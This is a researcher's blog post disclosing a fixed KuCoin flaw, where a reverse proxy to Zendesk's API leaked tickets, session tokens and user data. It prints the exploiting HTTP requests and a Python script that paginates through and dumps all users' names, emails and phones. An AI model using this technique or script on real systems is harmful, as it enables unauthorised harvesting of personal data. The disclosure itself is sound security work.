---
source: corben-leo
source_url: https://corben.io/blog/hacking-kucoin
title: "A $1,000,000 bounty? The KuCoin User Information Leak"
description: "A vulnerability in KuCoin & why HackenProof & KuCoin're not trustworthy."
---

## Introduction

One million bucks. Earning $1,000,000 for a vulnerability would be awesome.

Recently, a crypto exchange called KuCoin [announced](https://www.businesswire.com/news/home/20230324005334/en/) bounties up to $1,000,000 which they host on a bug bounty platform called HackenProof.

I saw HackenProof followed me on [Twitter](https://twitter.com/hacker_), so I shot them a DM to confirm:

I was skeptical. But hey, why not give it a shot?

## Discovery

When I approach a new target, my methodology is pretty simple.

- Proxy my browser traffic through Burp Suite.
- Click through the web application and understand the functionality.
- Analyze the HTTP requests logged in Burp Suite.

I started proxying my traffic Burp Suite. Registered for an account on KuCoin. Clicked through the site.

After a bit, I began digging through the HTTP requests logged in Burp Suite.

Nothing immediately caught my eye, until I came across the following:

```
GET /_api/zendesk/api/v2/help_center/en-us/articles/6545352890265.json HTTP/2
Host: www.kucoin.com
Connection: close
```


Zendesk is a customer service platform that allows businesses to manage customer support issues.

There were two references to API in this request: `/_api/zendesk`

and `/api/v2/`

.

Is this reverse proxying to the Zendesk API?

The response confirmed my suspicion:

```
{
"data": {
"article": {
"id": 6545352890265,
"url": "https://kucoin.zendesk.com/api/v2/help_center/en-us/articles/6545352890265.json",
"html_url": "https://kucoin.zendesk.com/hc/en-us/articles/6545352890265-Change-Login-Password",
"author_id": 903637920486,
"comments_disabled": true,
"draft": false,
"promoted": false,
"position": 0,
"vote_sum": 1,
"vote_count": 3,
"section_id": 6632289240345,
"created_at": "2022-05-12T12:33:28Z",
"updated_at": "2023-02-07T04:08:29Z",
"name": "Change Login Password",
"title": "Change Login Password",
"source_locale": "en-us",
"locale": "en-us",
"outdated": false,
"outdated_locales": [],
"edited_at": "2022-06-08T14:37:58Z",
"user_segment_id": null,
"permission_group_id": 830894,
"content_tag_ids": [],
"label_names": [],
"body": "<table class=\"wrapped confluenceTable\">\n<tbody>\n<tr>\n<td class=\"confluenceTd\">1. Can't Receive Email/SMS Verification Code</td>\n</tr>\n<tr>\n<td class=\"confluenceTd\">\n<a class=\"external-link\" href=\"https://support.kucoin.plus/hc/en-us/articles/360015206853-Cannot-Receive-Email-Code-SMS-message\" rel=\"nofollow\">https://support.kucoin.plus/hc/en-us/articles/360015206853-Cannot-Receive-Email-Code-SMS-message</a><br>Please check the messages in your frequently used phone number or email that you may have used for registration. There shall be an notification when you complete the registration. Then use the correct account to reset password.</td>\n</tr>\n<tr>\n<td class=\"confluenceTd\">2. Still Unable to Log in After Resetting the Login Password</td>\n</tr>\n<tr>\n<td class=\"confluenceTd\">Please retry after clearing the cache or switch the browser. If you're still unable to log in, please make sure you input it in the correct format; please exclude the country code, e.g., for +82 123456, enter '123456' only, or try to remove/add 0 before your phone number and try again.</td>\n</tr>\n</tbody>\n</table>"
}
},
"success": true
}
```


But would it forward every path under `/_api/zendesk/api/v2/*`

?

```
GET /_api/zendesk/api/v2/ HTTP/2
Host: www.kucoin.com
Connection: close
```


```
{
"data": "<!DOCTYPE html>\n<html dir=\"ltr\" lang=\"en-US\">\n<head>\n <meta charset=\"utf-8\" />\n <!-- v22727 -->\n\n <title>The page you were looking for doesn't exist – KuCoin Help Center</title>\n\n \n\n <meta name=\"robots\" content=\"noindex, nofollow, noarchive, nosnippet\">\n\n <link rel=\"stylesheet\" href=\"//static.zdassets.com/hc/assets/application-4457e15fd2317df56adee04580b8726d.css\" media=\"all\" id=\"stylesheet\" />\n <link rel=\"stylesheet\" type=\"text/css\" href=\"//p25.zdassets.com/hc/theming_assets/2196095/360000017594/style.css?digest=9096602929177\">\n\n <link rel=\"icon\" type=\"image/x-icon\" href=\"//theme.zdassets.com/theme_assets/2196095/8ea3012f8759412bafaffd7d07248ed1e75d8afa.ico\" />\n\n <script>\nwindow.ga=window.ga||function(){(ga.q=ga.q||[]).push(arguments)};ga.l=+new Date;\nga('create', 'UA-46608064-13', 'auto');\nga('send', 'pageview');\n</script>\n<script async src='https://www.google-analytics.com/analytics.js'></script>\n\n \n\n <meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0\"/>\n---SNIP---"
}
```


Yup. What can we do with this?

I pulled up the [API documentation](https://developer.zendesk.com/api-reference/introduction/security-and-auth/) and found the following:

You must be a verified user to make API requests. You can authorize against the API using either basic authentication with your email address and password, with your email address and an API token, or with an OAuth access token.


So...the Zendesk API requires you to be authenticated...KuCoin is proxying any request to the Zendesk API...

Can we just use the API as KuCoin's authenticated user?

## Tickets

I hit the tickets [endpoint](https://developer.zendesk.com/api-reference/ticketing/tickets/tickets/), which allows you to list, search support tickets.

I figured it wouldn't work.

```
GET /_api/zendesk/api/v2/tickets.json HTTP/2
Host: www.kucoin.com
Connection: close
```


To my surprise, it did.

```
HTTP/2 200 OK
Date: Tue, 18 Apr 2023 17:12:51 GMT
Content-Type: application/json
-- snip --
{
"data": {
"tickets": [{
"url": "https://kucoin.zendesk.com/api/v2/tickets/285403.json",
"id": 285403,
"external_id": null,
"via": {
"channel": "email",
"source": {
"from": {
"address": "help@poloniexus.circle.com",
"name": "Poloniex US"
},
"to": {
"name": "KuCoin",
"address": "support@kucoin.com"
},
"rel": null
}
},
--- snip ---
"next_page":"https://kucoin.zendesk.com/api/v2/tickets.json?page=2",
"previous_page":null,
"count":276479
```


There were **276479** tickets in Zendesk, containing sensitive information – PII (KYC info in attachments), session tokens, IP Addresses, account info, and more:

Even more fun, there's a `search.json`

endpoint which allows you to search tickets.

Which included session tokens:

### Stealing User Information:

```
GET /_api/zendesk/api/v2/users.json HTTP/2
Host: www.kucoin.com
Connection: close
```


It disclosed every user's name, email, phone number, & more. Thanks Zendesk API for supporting pagination!

Here's an example:

```
BASE_URL = 'https://www.kucoin.com/_api/zendesk/api/v2/'
def get_all_zendesk_users(dump=False):
page = BASE_URL + "/users.json"
while True:
r = requests.get(page)
dat = r.json().get('data')
users = dat.get('users')
for u in users:
print(f"{u['name']}, {u['email']}, {u['phone']}, {u['role']}")
if dump:
if dat.get('next_page') is None:
break
parsed_url = urlparse(dat.get('next_page'))
query_params = parse_qs(parsed_url.query)
page = query_params.get('page', [None])[0]
page = f"{BASE_URL}/users.json?page={page}"
else:
break
get_all_zendesk_users(dump=True)
```


I dumped a small sample of users to prove criticality to KuCoin.

### TL;DR:

You could use any endpoint specified in the Zendesk API documentation: [https://developer.zendesk.com/api-reference/](https://developer.zendesk.com/api-reference/) as KuCoin's admin user.

That's because `https://kucoin.com/_api/zendesk/api/v2`

reverse proxied to [https://kucoin.zendesk.com/api/v2/](https://kucoin.zendesk.com/api/v2/) with admin authentication.

## The Bounty

I reported the vulnerability to KuCoin on April 18th, 2023.

On April 23rd, I finally got the response that they fixed the issue:

Hi Sir: The issue has been fixed. After the team discussion, the current results are as follows: Impact of information leakage: some user names and mailbox data are leaked (not everyone uses zendesk, so the amount of leaks is limited). So Vulnerability rating does not reach critical, rated as high Bounty detail: Information leakage bonus 2000$, zendesk API unauthorized access bonus 3000$. Final Total bonus is 5000$


I think they're missing a zero...

So, I pushed back and argued about the severity. Unfortunately, I did not receive a response. I also attempted to open a mediation case with HackenProof but was met with silence.

Classic.

I understand that it doesn't actually impact the exchange monetarily (didn't impact the exchange's wallet), but seriously?

So, If you're thinking about hacking on HackenProof, don't! I wouldn't trust KuCoin as an exchange either.

You're better off hacking on HackerOne, BugCrowd, Intigriti, or Synack.

See you...not on HackenProof,

- Corben

**P.S:** Have you heard about [boring.co](https://boring.co)?